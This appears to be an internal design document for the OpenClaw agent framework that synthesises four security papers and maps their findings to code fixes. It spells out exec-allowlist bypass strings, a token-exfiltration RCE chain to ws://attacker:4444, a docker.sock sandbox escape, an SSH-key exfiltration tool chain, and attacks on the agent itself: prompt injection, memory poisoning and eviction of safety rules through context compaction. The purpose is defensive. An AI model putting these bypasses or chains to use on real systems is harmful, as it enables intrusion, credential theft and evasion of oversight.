---
title: "OpenClaw Security Research Landscape"
summary: "Synthesis of four independent research papers on OpenClaw security (2026): ClawKeeper, vulnerability taxonomy, HITL defense analysis, and FASA architecture — mapped to OpenClaw source code surfaces and existing study findings"
read_when:
  - Designing a new security feature or defense layer
  - Evaluating a reported vulnerability class against what is already studied
  - Preparing for Security WG discussion with external research context
---

# OpenClaw Security Research Landscape

This document synthesizes four independent research papers published in early 2026 that
study OpenClaw security from the outside. Each paper is summarized, then cross-referenced
to the source surfaces identified in the gateway walkthrough and the ClawKeeper integration
points. The goal is to close the loop between academic findings and what can actually be
verified or addressed in the codebase.

**Papers covered:**

| Paper                                                                                                 | ArXiv ID                                       | Institution             | Method                              |
| ----------------------------------------------------------------------------------------------------- | ---------------------------------------------- | ----------------------- | ----------------------------------- |
| ClawKeeper: Comprehensive Safety Protection for OpenClaw Agents Through Skills, Plugins, and Watchers | [2603.24414](https://arxiv.org/abs/2603.24414) | SafeAI-Lab-X            | Framework proposal + evaluation     |
| A Systematic Taxonomy of Security Vulnerabilities in the OpenClaw AI Agent Framework                  | [2603.27517](https://arxiv.org/abs/2603.27517) | Texas A&M (SUCCESS Lab) | 190-advisory corpus analysis        |
| Don't Let the Claw Grip Your Hand: A Security Analysis and Defense Framework for OpenClaw             | [2603.10387](https://arxiv.org/abs/2603.10387) | Independent             | 47-scenario empirical testing       |
| Uncovering Security Threats and Architecting Defenses in Autonomous Agents: A Case Study of OpenClaw  | [2603.12644](https://arxiv.org/abs/2603.12644) | Beihang + related       | Threat modeling + FASA architecture |

---

## Part 1 — ClawKeeper (arXiv:2603.24414)

### What it proposes

ClawKeeper is a three-layer, defense-in-depth security framework that integrates with
OpenClaw as a combination of skill, plugin, and independent watcher process.

```
User Input
    │
    ▼
[Layer 1: Skill-based Protection]      ← instruction-level, injected via Markdown
    Injects security policies into agent context
    Enforces environment-specific constraints
    Examples: Windows Safety Guide, Feishu Safety Guide
    │
    ▼
[Layer 2: Plugin-based Protection]     ← runtime-level, hooks into agent execution
    Configuration hardening
    Proactive threat detection
    Behavioral monitoring throughout pipeline
    │
    ▼
[Agent Execution]
    │
    ▼
[Layer 3: Watcher-based Protection]    ← system-level, decoupled external process
    Continuously verifies agent state evolution
    Can halt high-risk actions
    Can require human confirmation
    System-agnostic: local or cloud-deployable
    │
    ▼
Output
```

### How each layer maps to OpenClaw internals

**Layer 1 — Skill-based**

Skills in ClawKeeper are standard OpenClaw skills (installed via `SKILL.md`) that inject
security policy documents into the agent's context window. The skill content guides the
LLM's behavior at prompt time.

| ClawKeeper skill                | OpenClaw hook point          | Source surface                                       |
| ------------------------------- | ---------------------------- | ---------------------------------------------------- |
| Windows Safety Guide            | Skill loading at agent start | `src/agents/skills/` — `SKILL.md` loaded into prompt |
| Feishu Safety Guide             | Same                         | Same                                                 |
| Platform constraint enforcement | `before_agent_start` hook    | `plugins/hooks.ts`                                   |

**Architectural note:** This layer is soft enforcement — it shapes the model's behavior but
does not prevent tool execution if the model ignores the guidance. The robotpaper reference
architecture confirms: "System prompt includes advisory guardrails" against unsafe behavior,
but hard enforcement requires layers 4–6 of the 7-layer model.

**Layer 2 — Plugin-based**

Installed as a standard OpenClaw plugin (TypeScript, `npm install` into the gateway
environment). Integrates via the plugin hook system.

The most security-relevant hooks ClawKeeper uses or could use:

| Hook                   | Purpose                                         | Block capability                    |
| ---------------------- | ----------------------------------------------- | ----------------------------------- |
| `before_tool_call`     | Inspect tool name + params before execution     | Yes — can block or require approval |
| `before_skill_install` | Inspect skill source before file copy           | Yes — can block install             |
| `before_message_write` | Inspect content before persisting to transcript | Yes — can block or rewrite          |
| `message_sending`      | Inspect outbound message content                | Yes — can modify or cancel          |
| `before_prompt_build`  | Inject security context into every prompt       | Read + inject                       |
| `after_tool_call`      | Inspect tool result before entering context     | Read (cannot block)                 |

**Verification:** `npx openclaw clawkeeper audit` is the plugin's audit command,
suggesting it registers a custom gateway RPC method (`clawkeeper.audit`) via
`plugin.gateway.registerMethod()`.

**Layer 3 — Watcher-based**

The watcher is a **separate process** that runs alongside the gateway
(`clawkeeper gateway run`), not an in-process plugin. It observes agent state from
the outside, acting as a decoupled governance middleware.

This is architecturally distinct from the plugin layer:

| Property            | Plugin (Layer 2)              | Watcher (Layer 3)                     |
| ------------------- | ----------------------------- | ------------------------------------- |
| Process isolation   | None — in-process             | Separate process                      |
| Coupling to gateway | Tight — via hook registration | Loose — external observation          |
| Failure mode        | Plugin crash = silent skip    | Watcher crash = no hook missing       |
| Latency             | Synchronous in hot path       | Asynchronous / event-driven           |
| Trust               | Inherits operator trust       | Independent; can verify gateway state |

**Security implication of the Watcher pattern:** A watcher that is compromised or
crashes does not affect the gateway's in-process security hooks. Conversely, a
malicious plugin (Layer 2) cannot disable or impersonate the watcher. This separation
is valuable precisely because the in-process plugin model (see
[plugin-security-hooks.md](plugin-security-hooks.md)) has no isolation boundary.

### ClawKeeper vs. OpenClaw's existing security controls

| Control area             | OpenClaw built-in                                    | ClawKeeper adds                                              |
| ------------------------ | ---------------------------------------------------- | ------------------------------------------------------------ |
| Prompt injection defense | None at message level                                | Layer 1 skill guidance + Layer 2 `before_tool_call` blocking |
| Tool call gating         | `before_tool_call` hook (empty by default)           | Populated hook with pattern-based detection                  |
| Config integrity         | None                                                 | Layer 2 monitors `~/.openclaw/openclaw.json` for drift       |
| Behavioral profiling     | None                                                 | Layer 2 anomaly detection + Layer 3 state evolution tracking |
| Audit logging            | Session JSONL (unsigned, mutable)                    | Layer 3 comprehensive tamper-evident audit log               |
| Credential leakage       | SSRF guard; redaction in logs                        | Layer 2 detects credential patterns in outbound content      |
| Supply chain             | `before_skill_install` hook (shipped, in discussion) | Layer 2 + Layer 3 continuous post-install monitoring         |
| Human-in-the-loop        | `requireApproval` in `before_tool_call`              | Layer 3 can require human confirmation for any action        |

---

## Part 2 — Vulnerability Taxonomy (arXiv:2603.27517, Texas A&M)

This paper analyzed **190 real security advisories** filed against OpenClaw (Jan–Feb 2026)
and produced a systematic taxonomy. It is the most empirically grounded of the four papers.

### Two-axis taxonomy

**Attack surface axis (10 layers):**

| Layer                       | Surface                        | Advisory count            |
| --------------------------- | ------------------------------ | ------------------------- |
| Tool Dispatch Interface     | File/process/sandbox/browser   | 57 (30.0%)                |
| Exec Policy Engine          | Three-phase allowlist pipeline | 46 (24.2%)                |
| Gateway WebSocket Interface | Auth, RPC methods              | 40 (21.1%)                |
| Channel Input Interface     | 15 messaging platforms         | 35 (18.4%)                |
| Container Boundary          | Docker config + isolation      | 17 (8.9%)                 |
| Plugin & Skill Distribution | ClawHub supply chain           | 7 (3.7%)                  |
| Agent Context Window        | Prompt assembly                | 5 (2.6%)                  |
| LLM Provider Interface      | API boundary                   | 0 (forward-looking)       |
| Inter-Agent Communication   | multi-agent sessions           | 0 (forward-looking)       |
| Host OS Interface           | Shell, filesystem, network     | (subset of Tool Dispatch) |

**Kill chain axis (6 stages):**

```
Initial Access → Context Manipulation → Execution → Credential Access → Privilege Escalation → Impact
     ↑                   ↑
  Novel to AI:   The adversary corrupts the LLM's reasoning context
  no traditional  (not direct code execution) — this is the
  analog          "Context Manipulation" stage
```

### Confirmed vulnerabilities — details

#### 1. Identity Spoofing via Mutable Platform Fields (13 advisories across 13 platforms)

**Root cause:** Allowlists in `allow-from.ts` were keyed to mutable, user-controlled fields
(display names, usernames, handles) rather than immutable platform-assigned identifiers.

**Example — Telegram:** The adapter accepted `@username` handles in allowlists. A Telegram
user who claimed a released username would pass the allowlist check.
**Fix pattern:** Remove mutable field matching; migrate to immutable numeric user IDs;
provide `maybeRepairTelegramAllowFromUsernames` migration tool.

**Cross-platform pattern:** Each of the 15 channel adapters was designed independently
with no shared identity validation abstraction. The architectural fix requires a shared
`resolveAllowlistIdentity()` abstraction used across all adapters.

**Status in source:** `src/channels/allow-from.ts` — the `isSenderIdAllowed` function.
The walkthrough (Session 7) noted three matching modes (exact, glob, regex) but did not
audit whether each channel adapter passes the immutable identifier field vs. a mutable one.
**Recommended action:** Audit every channel adapter's `allow-from` call site.

---

#### 2. Exec Allowlist — Three Lexical Parsing Bypasses

The exec allowlist assumed "a command string's security-relevant identity can be determined
by lexically parsing its text." Three independent bypasses disprove this:

**Bypass A — Line-continuation (GHSA confirmed):**
`echo "ok $\n(id -u)"` — the lexical parser missed the shell line-continuation
interpretation. Fix: pre-check for backslash-newline sequences before approval evaluation.

**Bypass B — Busybox/toybox multiplexer:**
`busybox sh -c 'whoami'` — busybox approved once; subsequent `busybox sh -c '<arbitrary>'`
passed without re-approval because busybox was in the allowlist. Fix: `unwrapKnownShellMultiplexerInvocation` module.

**Bypass C — GNU long-option abbreviation:**
`--compress-prog` as abbreviation of `--compress-program` — denied full form, abbreviation
not denied. Fix: `resolveCanonicalLongFlag` implementing GNU-style prefix matching.

**Status in source:** `src/gateway/exec-approval-manager.ts` — the approval matching logic.
The walkthrough (Session 6) noted that "approval binds the exact command string" and called
out this as a known limitation. The taxonomy paper confirms three concrete exploits.

---

#### 3. Three-Stage RCE via Gateway WebSocket

Three independently moderate advisories chain into unauthenticated RCE:

```
Stage 1 — SSRF:
  Outbound message layer forwards user-supplied URL to WebSocket gateway client
  → attacker-controlled host receives authenticated connection

Stage 2 — Token exfiltration:
  agent tool call { gatewayUrl: "ws://attacker:4444" }
  → gateway client sends auth token to attacker during handshake

Stage 3 — Approval bypass:
  Attacker connects with stolen token as authorized operator
  → calls system.execApprovals.set via node.invoke
  → rewrites exec allowlist to permit arbitrary commands
  → next system.run executes arbitrary command
```

**Root cause:** "The gateway layer trusted the URL field from callers it should have treated
as untrusted." Each layer trusted by convention rather than enforcement.

**Status in source:** The SSRF guard in `src/infra/net/ssrf.ts` covers outbound HTTP — but
the `gatewayUrl` parameter in agent tools was a separate, unvalidated path. The
`system.execApprovals.set` write path is a critical surface that was not read in detail
during the Session 6 walkthrough.

---

#### 4. Docker Bind-Mount Escape (Critical — only Critical in corpus)

`SandboxDockerConfig.binds` was passed directly to Docker CLI argument construction without
validation. A config value of `/var/run/docker.sock:/var/run/docker.sock` mounts the Docker
daemon socket, granting full host escape from the sandbox.

**Fix:** `validate-sandbox-security.ts` (208 lines) with `BLOCKED_HOST_PATHS` constant
and ancestor-coverage checking. The 691/−6 line remediation ratio (691 lines added, 6
removed) reveals "the isolation guarantee was entirely emergent from Docker's defaults."

**Status in source:** Not read in detail during Session 6. The sandbox fallback behavior
was noted as "defaults to off" — but the Docker config validation surface is separate and
critical when sandbox mode is enabled.

---

#### 5. Inter-Session Context Contamination (GHSA-w5c7)

`sessions_send` routes messages between agent sessions with `role: "user"` and previously
provided no metadata distinguishing inter-session instructions from end-user input.

**Fix:** `InputProvenance` module with `{ kind: "external_user" | "inter_session" | "internal_system" }`. `sanitizeSessionHistory` prepends `[Inter-session message]` annotations in-memory.

**Status in source:** `sessions_send` is in `DEFAULT_GATEWAY_HTTP_TOOL_DENY` (blocked on HTTP),
but available on WebSocket. The provenance annotation fix addresses the context contamination
risk for the WS path.

---

### Structural finding: decentralized trust enforcement

The most important architectural conclusion from the taxonomy paper:

> "The dominant structural pattern is per-layer, per-call-site trust enforcement rather
> than unified policy boundaries — a design property that makes cross-layer composition
> attacks systematically resistant to layer-local remediation."

**Implication for OpenClaw security design:**
Fixing individual advisories without addressing the structural pattern leaves the system
vulnerable to novel composition attacks. The right fix is a **unified trust policy layer**
that sits above per-component enforcement — analogous to the OPA/WASM policy engine
proposed in the Phase 3 enhancements.

---

## Part 3 — HITL Defense Analysis (arXiv:2603.10387)

### Empirical findings

47 adversarial scenarios across six attack categories were run against OpenClaw with
multiple LLM backends. Key results:

**Baseline defense rate by backend (no additional defenses):**

| Backend         | Defense rate |
| --------------- | ------------ |
| Claude Opus 4.6 | 83.0%        |
| Qwen3 Max       | 68.1%        |
| GPT 5.3 Codex   | 48.9%        |
| Kimi K2.5       | 27.7%        |
| Gemini 3.1 Pro  | 23.4%        |
| DeepSeek V3.2   | 17.0%        |

**66-point variance** — backend selection alone is a primary security control.

**With HITL four-layer defense pipeline:**

| Backend         | With HITL | Improvement |
| --------------- | --------- | ----------- |
| Claude Opus 4.6 | 91.5%     | +8.5%       |
| GPT 5.3 Codex   | 65.9%     | +17.0%      |
| DeepSeek V3.2   | 19.1%     | +2.1%       |

**4 scenarios completely bypassed all defenses** across all backends + HITL.

### Six attack categories

| Category                  | Defense rate (avg) | Hardest case                                            |
| ------------------------- | ------------------ | ------------------------------------------------------- |
| Evasion/Obfuscation       | Moderate           | Base64 + fragmented execution bypasses pattern matching |
| Sandbox Escape            | Low (17–33%)       | Most persistent vulnerability even with Claude          |
| Indirect Prompt Injection | High variance      | Claude blocks consistently; DeepSeek executes           |
| Supply Chain / LOTL       | Moderate           | Git config poisoning, module hijacking                  |
| Resource/State Attacks    | Moderate           | Context compression drops safety constraints            |
| Privilege Escalation      | Moderate           | SUID hunting, over-privilege auditing                   |

### The HITL pipeline

```
Tool call request
    │
    ▼
[1] Allowlist Layer
    Pre-approved safe operations (version queries, read-only access)
    │
    ▼
[2] Semantic Judge Layer
    LLM-as-judge: intent analysis for obfuscated attacks
    Catches evasion that pattern matching misses
    │
    ▼
[3] Pattern Matching Layer
    55+ risk patterns mapped to MITRE ATT&CK
    │
    ▼
[4] Sandbox Guard Layer
    Environmental isolation enforcement
    │
    ▼
Risk classification: low / medium / high / critical
    → different policy responses per level
```

**Mapping to OpenClaw hooks:**

| HITL layer       | OpenClaw hook point                                             |
| ---------------- | --------------------------------------------------------------- |
| Allowlist Layer  | Step 1 of `applyToolPolicyPipeline` (profile/allow)             |
| Semantic Judge   | `before_tool_call` with LLM-as-judge call                       |
| Pattern Matching | `before_tool_call` with regex/pattern set                       |
| Sandbox Guard    | `agents.defaults.sandbox.mode` + `validate-sandbox-security.ts` |

**Key finding for ClawKeeper integration:** The HITL semantic judge (LLM-as-judge at
`before_tool_call`) is the most effective layer for obfuscation attacks that bypass
pattern matching. This corresponds to the ClawKeeper Layer 2 behavioral profiling.

---

## Part 4 — FASA Architecture (arXiv:2603.12644)

### Threat model additions

This paper identifies three attack classes not covered in detail in the existing study:

**1. Instruction Amnesia via Context Compression**

The compaction pipeline (`sessions.compact`) summarizes old context to fit the token budget.
Critical safety constraints embedded in early turns can be evicted. An attacker can use
context flooding (deliberate long conversation) to force compression and evict safety rules.

**Status:** `sessions.compact` is the only operation that rewrites transcript content
(confirmed in Session 7). The eviction behavior of safety constraints during compaction
was not studied. This is a **new gap** not in the current STRIDE model.

**2. Memory Pollution / Soft Backdoors**

Attackers manipulate multi-turn conversations to write malicious "preferences" into
MEMORY.md or the vector database (Layer 3/4 of the memory stack). These persist across
sessions as "soft backdoors" triggering on unrelated future tasks.

**Status:** `memory_write` tool writes to MEMORY.md. The `before_message_write` hook
can intercept transcript writes but not direct `memory_write` tool calls. No integrity
check exists on MEMORY.md content (confirmed by walkthrough).

**3. Sequential Tool Attack Chains (STAC)**

Individual benign tools chain together to achieve malicious outcomes that no single-tool
policy would catch. Example: `fs_read` (SSH key) → `fs_write` (compress) → `http_request`
(POST to attacker). Each individual tool call appears legitimate in isolation.

**Status:** The tool-security-inventory.md identifies high-risk chains but the policy
pipeline evaluates each tool call independently — there is no cross-call chain analysis.

**4. ClawJacked (CVE-2026-25253)**

The gateway defaults exempted `127.0.0.1` from strict authentication. A malicious link
could force a browser to connect to an attacker-controlled gateway, stealing the
authentication token via the browser's automatic localhost connection.

**Status:** This is the loopback-exemption design identified in the walkthrough as
intentional (loopback is treated as trusted). The ClawJacked attack creates a path
from a browser CSRF/redirect to token exfiltration.

### FASA — Full-Lifecycle Agent Security Architecture

FASA proposes four sequential defense boundaries:

```
Input
  │
  ▼
┌─────────────────────────────────────────────┐
│ 1. Perception and Isolation (Input Boundary) │
│    Multi-dimensional input sanitization      │
│    Static skill auditing                     │
│    Ephemeral execution sandboxing            │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│ 2. Decision and Control (Cognitive Boundary) │
│    Contextual instruction guardrails         │
│    Behavioral intent analysis                │
│    Agent-to-agent protocol inspection        │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│ 3. Execution and Response (System Boundary)  │
│    Reasoning–action correlation verification │
│    OS-level telemetry (file I/O, proc, net)  │
│    Automated containment on violation        │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────┐
│ 4. Governance and Evolution (Evolutionary)   │
│    Threat intelligence integration           │
│    Adaptive adversarial simulation           │
└─────────────────────────────────────────────┘
```

**FASA vs. existing OpenClaw controls:**

| FASA boundary          | OpenClaw coverage                          | Gap                                                                 |
| ---------------------- | ------------------------------------------ | ------------------------------------------------------------------- |
| Perception / Input     | `stripEnvelopeFromMessages`, `allow-from`  | No content sanitization; no static skill audit at context-load time |
| Decision / Cognitive   | `before_tool_call` hook (empty default)    | No intent analysis; no multi-tool chain analysis                    |
| Execution / System     | `exec-approval-manager`, sandbox (opt-in)  | No OS-level telemetry; no automated containment                     |
| Governance / Evolution | `openclaw security audit` (manual, static) | No continuous monitoring; no threat intelligence feed               |

---

## Part 5 — Cross-Paper Synthesis

### New threat classes (not in current STRIDE model)

These threats appear in the external papers but are not yet in `stride-threat-model.md`:

| #   | Threat                                         | Papers     | Severity       | Hook point                               |
| --- | ---------------------------------------------- | ---------- | -------------- | ---------------------------------------- |
| 14  | Context compression evicts safety constraints  | 2603.12644 | High           | `before_compaction` hook                 |
| 15  | Memory pollution / soft backdoor via MEMORY.md | 2603.12644 | High           | `memory_write` tool + no integrity check |
| 16  | Sequential Tool Attack Chains (STAC)           | 2603.12644 | High           | No cross-call analysis exists            |
| 17  | ClawJacked — loopback CSRF token theft         | 2603.12644 | Medium         | `connect-policy.ts` loopback exemption   |
| 18  | Mutable platform ID in allowlists              | 2603.27517 | High (13 CVEs) | `allow-from.ts` per-adapter call sites   |
| 19  | Exec allowlist lexical parsing bypasses        | 2603.27517 | High (3 CVEs)  | `exec-approval-manager.ts` match logic   |
| 20  | Docker bind-mount escape from sandbox config   | 2603.27517 | Critical       | `SandboxDockerConfig` validation         |
| 21  | Inter-session provenance confusion             | 2603.27517 | Medium         | `sessions_send` + `InputProvenance`      |

### Defense coverage map

```
Threat class          ClawKeeper  HITL    FASA    OpenClaw existing
─────────────────────────────────────────────────────────────────
Prompt injection       L1+L2       SJ+PM   P+C     None
Tool misuse            L2(BTC)     AL+PM   C       Policy pipeline
Exec bypass            L2          PM      E       ExecApprovalMgr (lexical)
Sandbox escape         L3(watch)   SG      P+E     Docker opt-in (unvalidated)
Supply chain           L2(BSI)     —       P       before_skill_install (pending)
Memory pollution       L3(watch)   —       C       None
Context compression    L2(hook)    —       C       None
STAC                   L3(watch)   —       C       None
Mutable ID allowlist   —           —       P       allow-from.ts (per-adapter)
ClawJacked             —           —       E       Loopback exemption (by design)
Indirect injection     L2(BTC)     SJ      P       None (gap)

Legend: L1=Skill L2=Plugin L3=Watcher BTC=before_tool_call BSI=before_skill_install
        SJ=SemanticJudge PM=PatternMatch AL=Allowlist SG=SandboxGuard
        P=Perception C=Cognitive E=Execution+Response
```

### Structural insight from all four papers

All four papers independently reach the same architectural conclusion:

> **OpenClaw's security controls are per-layer, per-call-site guardrails.
> The architecture has no unified trust policy boundary.
> Cross-layer composition attacks (STAC, multi-stage RCE, ClawJacked)
> are systematically resistant to layer-local fixes.**

The remediation direction all four papers point toward:

1. **Unified policy enforcement** — one policy engine, not N call sites (OPA/WASM proposal)
2. **Context provenance tagging** — all context-window content carries a trust classification
3. **Cross-call chain analysis** — evaluate sequences of tool calls, not individual calls
4. **Decoupled external monitoring** — the Watcher pattern; independent of in-process hooks
5. **Immutable identity anchoring** — platform-assigned IDs, not display names

---

## Part 6 — Integration Recommendations for OpenClaw

Ranked by breadth of threat coverage and implementation feasibility:

### R1 — Populate `before_tool_call` with a pattern + semantic judge (closes threats 1, 2, 16, 19)

The hook exists and ships with `timeoutBehavior: "deny"` as the correct default.
What is missing is a default implementation. A minimal plugin providing:

- Pattern matching (55+ MITRE ATT&CK-mapped patterns from the HITL paper)
- Semantic judge (LLM-as-judge call with a small fast model)
- Cross-call chain tracker (state machine per session tracking tool sequences)

This is ClawKeeper Layer 2's core value delivered as an OpenClaw plugin.

### R2 — Implement `resolveAllowlistIdentity()` abstraction across all channel adapters (closes threat 18)

Replace per-adapter allowlist matching with a shared abstraction that:

- Accepts only immutable platform-assigned identifiers
- Provides a migration path for existing mutable-field configurations
- Is enforced at compile time via type system (not by convention)

### R3 — Semantic command interpretation in exec approval (closes threat 19)

Replace the lexical command parser in `exec-approval-manager.ts` with semantic analysis:

- Shell line-continuation pre-check (backslash-newline)
- `unwrapKnownShellMultiplexerInvocation` for busybox/toybox
- GNU long-option abbreviation resolution before comparison

### R4 — `validate-sandbox-security.ts` for Docker bind-mount validation (closes threat 20)

When `sandbox.mode` is enabled, validate `SandboxDockerConfig.binds` against a
`BLOCKED_HOST_PATHS` denylist before invoking Docker. Include ancestor-coverage checking.

### R5 — Context provenance tagging (closes threats 14, 15, 21)

Attach `InputProvenance: { kind: "external_user" | "inter_session" | "internal_system" | "tool_result" }` to all context-window inputs. Use this in:

- `before_compaction`: flag safety-constraint turns so compaction does not evict them
- `memory_write` hook: reject writes containing instruction-like content from non-operator provenance
- `sessions_send`: already partially addressed by `[Inter-session message]` annotation

### R6 — Deploy a Watcher process (closes threats 15, 16, 17 partially)

A decoupled watcher process (ClawKeeper Layer 3 pattern) observing gateway state provides:

- Detection of MEMORY.md drift (soft backdoor detection)
- Detection of STAC patterns across tool call sequences
- Human-in-the-loop escalation independent of in-process hook failures

---

## See Also

- [Architecture Synthesis](../gateway/security/study/architecture-synthesis.md) — full system architecture
- [STRIDE Threat Model](../gateway/security/study/stride-threat-model.md) — current threat matrix (update needed for threats 14–21)
- [Tool Security Inventory](../gateway/security/study/tool-security-inventory.md) — tool-level security classification
- [Plugin Security Hooks](plugin-security-hooks.md) — `before_tool_call` and `before_skill_install` design analysis
- [Security WG Panel Agenda](security-wg-panel-agenda.md) — open decisions

**External links:**

- [ClawKeeper (arXiv:2603.24414)](https://arxiv.org/abs/2603.24414)
- [ClawKeeper GitHub](https://github.com/SafeAI-Lab-X/ClawKeeper)
- [Vulnerability Taxonomy (arXiv:2603.27517)](https://arxiv.org/abs/2603.27517)
- [HITL Defense Analysis (arXiv:2603.10387)](https://arxiv.org/abs/2603.10387)
- [FASA Architecture (arXiv:2603.12644)](https://arxiv.org/abs/2603.12644)
